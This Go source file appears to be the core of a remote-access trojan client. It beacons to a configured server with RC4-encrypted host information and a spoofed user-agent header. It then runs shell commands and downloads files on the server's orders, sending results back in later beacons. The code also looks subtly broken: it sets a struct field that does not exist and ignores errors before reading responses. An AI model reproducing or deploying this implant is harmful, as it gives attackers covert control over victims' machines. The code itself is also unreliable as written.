package core

import (
	"C/config"
	"C/shell"
	"C/utils"
	"bytes"
	"encoding/base64"
	"encoding/json"
	//"fmt"
	"io/ioutil"
	//"log"
	"net/http"
	"strconv"
	"strings"
	"time"
)

type Event struct { // 本地事件
	Action string `json:"action"`
	Data   string `json:"data"`
}

type Heartbeat struct { //心跳包
	Uuid       string            `json:"uuid"`
	Result     []Event           `json:"result"`
	Info       utils.Information `json:"info"`
	Sleep int                    `json:"sleep"`
}
type Action struct {// 服务器下发的包
	Do   string `json:"do"`
	Data string `json:"data"`
}

type Core struct {
	remoteAddress string
	info          utils.Information
	sleep         int
	uuid          string
	event         []Event
}

func (c *Core) RefreshInfo() {
	c.info = utils.GetInformation()
}
func (c *Core) Pool() {
	client := &http.Client{}
	for {
		time.Sleep(time.Duration(c.sleep) * time.Second)
		var action []Action
		data := Heartbeat{Uuid: c.uuid, Event: c.event, Info: c.info, Sleep: c.sleep}
		c.event = nil
		bytesJson, err := json.Marshal(data)
		if err != nil {
			continue
		}
		encode := utils.ImmediateRC4(bytesJson)
		req, err := http.NewRequest("POST", c.remoteAddress, bytes.NewReader(encode))
		if err != nil {
			//fmt.Println(2)
			//log.Fatal(err)
		}
		req.Header.Add("UA", "android")
		resp, err := client.Do(req)
		if err != nil {
			//log.Fatal(err)
		}
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			//fmt.Println(3)
			//log.Fatal(err)
		}
		decode := utils.ImmediateRC4(body)

		err = json.Unmarshal(decode, &action)
		if err != nil {
			//fmt.Println(4)
			//log.Fatal(err)
		}
		for _, i := range action {
			switch i.Do {
			case "cmd":

				cmdData, err := base64.StdEncoding.DecodeString(i.Data)
				if err != nil {
					c.event = append(c.event, Event{Action: "cmd", Data: err.Error()})
					break
				}
				//fmt.Println("cmd", cmdData)
				var cmd shell.Shell
				err = json.Unmarshal([]byte(cmdData), &cmd)
				if err != nil {

					c.event = append(c.event, Event{Action: "cmd", Data: err.Error()})
					break
				}
				go func() {
					c.event = append(c.event, Event{Action: "cmd", Data: cmd.ExecuteCmd()})
				}()

			case "download":
				var down shell.Down
				downData, err := base64.StdEncoding.DecodeString(i.Data)
				if err != nil {
					c.event = append(c.event, Event{Action: "download", Data: err.Error()})
					break
				}
				err = json.Unmarshal([]byte(downData), &down)
				if err != nil {
					c.event = append(c.event, Event{Action: "download", Data: err.Error()})
				}
				go func() {
					c.event = append(c.event, Event{Action: "download", Data: down.Download()})
				}()

			case "remark":
				var remark shell.Remark
				remarkData, err := base64.StdEncoding.DecodeString(i.Data)
				if err != nil {
					c.event = append(c.event, Event{Action: "remark", Data: err.Error()})
					break
				}
				err = json.Unmarshal([]byte(remarkData), &remark)
				if err != nil {
					c.event = append(c.event, Event{Action: "remark", Data: err.Error()})
				}
				go func() {
					c.event = append(c.event, Event{Action: "remark", Data: "Change Remark Successful."})
				}()
			case "sleep":
				sleep, err := strconv.Atoi(i.Data)
				if err == nil {
					c.sleep = sleep
				}
			}
		}
	}
}

func NewClient() Core {
	var u string
	
	u = utils.RandStringRunes(16)
	
	//fmt.Println("Target", strings.TrimSpace(config.RemoteAddress))
	c := Core{
		remoteAddress: strings.TrimSpace(config.RemoteAddress),
		info:          utils.GetInformation(),
		uuid:          u,
		sleep:         config.DefaultSleep,
	}
	return c
}
